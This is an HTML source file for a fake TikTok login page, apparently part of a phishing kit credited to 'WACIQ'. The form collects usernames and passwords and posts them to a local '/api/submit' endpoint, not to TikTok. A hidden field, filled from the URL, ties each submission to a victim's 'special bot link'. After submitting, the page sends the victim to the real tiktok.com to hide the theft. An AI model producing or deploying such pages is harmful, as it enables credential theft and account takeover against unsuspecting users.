<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">

  <style>
    body {
      background-color: #000;
      font-family: 'Roboto', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background-color: #111;
      border: 1px solid #222;
      padding: 40px 30px;
      border-radius: 10px;
      width: 340px;
      text-align: center;
      box-shadow: 0 0 10px #f00;
    }

    .logo {
      width: 60px;
      margin-bottom: 15px;
    }

    .brand-name {
      font-size: 28px;
      font-weight: bold;
      margin-bottom: 25px;
      color: #fff;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 4px;
      font-size: 14px;
    }

    input {
      border: 1px solid #333;
      background-color: #222;
      color: #eee;
    }

    button {
      background-color: #ff0050;
      color: white;
      font-weight: bold;
      border: none;
      cursor: pointer;
    }

    button:hover {
      background-color: #e60047;
    }

    .credit {
      margin-top: 20px;
      font-size: 12px;
      color: #888;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/TikTok_logo.svg" alt="TikTok Logo" class="logo" />
    <div class="brand-name">TikTok</div>

    <form method="POST" action="/api/submit" id="loginForm">
      <input type="text" name="username" placeholder="Email / Phone / Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <input type="hidden" name="uid" id="uid" />
      <button type="submit">Log In</button>
    </form>

    <div class="credit">Powered by WACIQ</div>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const uid = params.get('uid');
    if (uid) {
      document.getElementById("uid").value = uid;
    } else {
      alert("❌ UID not found. Please use your special bot link.");
      document.getElementById("loginForm").addEventListener("submit", function(e) {
        e.preventDefault();
      });
    }

    document.getElementById('loginForm').addEventListener('submit', function() {
      setTimeout(() => {
        window.location.href = "https://tiktok.com";
      }, 1500);
    });
  </script>

</body>
</html>
